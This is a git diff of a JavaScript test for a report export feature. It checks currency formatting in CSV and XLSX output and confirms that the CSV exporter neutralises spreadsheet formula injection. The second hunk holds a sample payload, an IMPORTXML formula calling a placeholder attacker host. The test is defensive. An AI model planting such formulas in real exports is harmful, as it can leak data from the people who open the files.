@@ -120,6 +120,12 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
         {field:'currency',operator:'equals',value:'USD'},
         {field:'pricing_complete',operator:'equals',value:'yes'}],sort:'total'});
     assert.equal(Number(quoted.rows[0].total),750);
+    assert.equal(quoted.displayRows[0].total,'$7.50');
+    const quotedCsv=reportExports.csv(quoted).toString();
+    assert.match(quotedCsv,/"\$7\.50"/);
+    assert.doesNotMatch(quotedCsv,/"750"/);
+    const quotedWorkbook=readWorkbook(reportExports.xlsx(quoted));
+    assert.equal(quotedWorkbook.sheets[0].rows[1][1],'$7.50');
     const moneyChart=await reportAsk.prepare(database,ctx,
       'Make a bar chart of fully priced quoted order value by customer in USD',{provider:{
         async complete(input){if(input.schemaName==='stockchief_governed_report_fit')
@@ -401,7 +407,7 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
       {role:'staff',permissions:['VIEW']}),/permission|authorized|view/i);
     assert.ok(reportExports.csv(stock).toString().includes('Copper Clamp'));
     const unsafe={...stock,rows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],
-      columns:['product']};
+      displayRows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],columns:['product']};
     assert.match(reportExports.csv(unsafe).toString(),/^"product"\r\n"'=IMPORTXML/);
     const accented=await reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}});
     assert.match(accented.toString('ascii'),/^%PDF-1\.[3-7]/);
